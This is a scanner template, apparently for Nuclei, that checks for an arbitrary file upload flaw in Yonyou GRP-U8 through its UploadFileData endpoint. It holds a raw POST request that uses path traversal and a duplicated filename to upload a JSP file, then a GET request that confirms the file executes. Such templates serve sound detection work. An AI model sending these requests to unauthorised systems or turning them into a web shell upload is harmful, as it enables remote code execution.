id: poc-yaml-yongyou-grp-u8-uploadfiledata-anyfile-upload
info:
  name: 用友 GRP-U8 UploadFileData 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  random_content: "{{rand_text_alphanumeric(12)}}"
  random_name: "{{rand_text_alphanumeric(8)}}"

http:
  - raw:
      - |
        POST /UploadFileData?action=upload_file&1=1&foldername=%2e%2e%2f&filename={{random_name}}.jsp&filename=1.jpg HTTP/1.1
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: multipart/form-data
        Host: {{Hostname}}

        ------WebKitFormBoundary92pUawKc
        Content-Disposition: form-data; name="myFile";filename="test.jpg"

        <% out.println("{{random_content}}");%>
        ------WebKitFormBoundary92pUawKc--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "showSucceedMsg"

  - raw:
      - |
        GET {{BaseURL}}/{{random_name}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{random_content}}"
